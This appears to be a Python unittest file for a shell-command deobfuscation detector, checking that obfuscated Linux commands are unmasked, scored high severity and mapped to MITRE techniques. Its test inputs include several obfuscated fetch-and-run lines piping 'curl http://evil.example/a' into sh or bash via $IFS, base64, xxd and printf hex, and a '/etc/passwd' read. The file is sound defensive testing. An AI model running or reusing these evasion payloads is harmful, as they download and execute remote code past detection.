"""Tests for Linux shell (bash/sh) and VBScript/JScript deobfuscation."""

from __future__ import annotations

import unittest

from cmd_unmask.models import Severity
from cmd_unmask.resolver import resolve_expression_node as resolve_expressions
from cmd_unmask.unpacker import unmask_command


class TestLinuxShellDeobfuscationLayer(unittest.TestCase):
    """Verify static Linux shell ($IFS, ANSI-C, base64, xxd/printf) deobfuscation and rigidity."""

    def test_ifs_inline_delimiter_unmasked_and_scored(self) -> None:
        cmd = "curl$IFS-s$IFShttp://evil.example/a|sh"
        res = resolve_expressions(cmd)
        self.assertTrue(res.modified)
        self.assertEqual(res.resolved_text, "curl -s http://evil.example/a|sh")

        verdict = unmask_command(cmd, source_id="linux-ifs-1")
        self.assertIn("curl -s http://evil.example/a|sh", verdict.primary_unmasked_payload)
        self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
        mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
        self.assertIn("T1059.004", mitre_ids)
        self.assertIn("T1105", mitre_ids)

        res2 = resolve_expressions("cat${IFS}/etc/passwd")
        self.assertTrue(res2.modified)
        self.assertEqual(res2.resolved_text, "cat /etc/passwd")

    def test_ansi_c_hex_and_octal_quoting_folded(self) -> None:
        res_hex = resolve_expressions("$'\\x63\\x75\\x72\\x6c'")
        self.assertTrue(res_hex.modified)
        self.assertEqual(res_hex.resolved_text, "'curl'")

        res_oct = resolve_expressions("$'\\143\\165\\162\\154'")
        self.assertTrue(res_oct.modified)
        self.assertEqual(res_oct.resolved_text, "'curl'")

    def test_echo_base64_decode_pipe_to_shell(self) -> None:
        for flag in ("-d", "--decode"):
            cmd = f"echo Y3VybCAtcyBodHRwOi8vZXZpbC5leGFtcGxlL2E= | base64 {flag} | bash"
            verdict = unmask_command(cmd, source_id="linux-b64-1")
            self.assertIn("curl -s http://evil.example/a", verdict.primary_unmasked_payload)
            self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
            mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
            self.assertIn("T1059.004", mitre_ids)
            self.assertIn("T1105", mitre_ids)

    def test_xxd_and_printf_hex_to_shell_pipelines(self) -> None:
        cmd_xxd = "echo 6375726c20687474703a2f2f6576696c2e6578616d706c652f61 | xxd -r -p | sh"
        verdict_xxd = unmask_command(cmd_xxd, source_id="linux-xxd-1")
        self.assertIn("curl http://evil.example/a", verdict_xxd.primary_unmasked_payload)
        self.assertIn(verdict_xxd.severity, (Severity.HIGH, Severity.CRITICAL))

        cmd_printf = (
            "printf '\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f"
            "\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65\\x2f\\x61' | bash"
        )
        verdict_printf = unmask_command(cmd_printf, source_id="linux-printf-1")
        self.assertIn("curl http://evil.example/a", verdict_printf.primary_unmasked_payload)
        self.assertIn(verdict_printf.severity, (Severity.HIGH, Severity.CRITICAL))

    def test_benign_linux_sysadmin_commands_score_benign(self) -> None:
        benign_cmds = [
            "apt-get update && apt-get install -y curl",
            "systemctl restart nginx",
            "ls -la /var/log",
            'printf "Hello %s\\n" "$USER"',
            "IFS= read -r line < file.txt",
        ]
        for idx, cmd in enumerate(benign_cmds):
            verdict = unmask_command(cmd, source_id=f"linux-benign-{idx}")
            self.assertEqual(verdict.severity, Severity.BENIGN, f"False positive on: {cmd}")
            self.assertEqual(verdict.risk_score, 0, f"Non-zero score on: {cmd}")


if __name__ == "__main__":
    unittest.main()
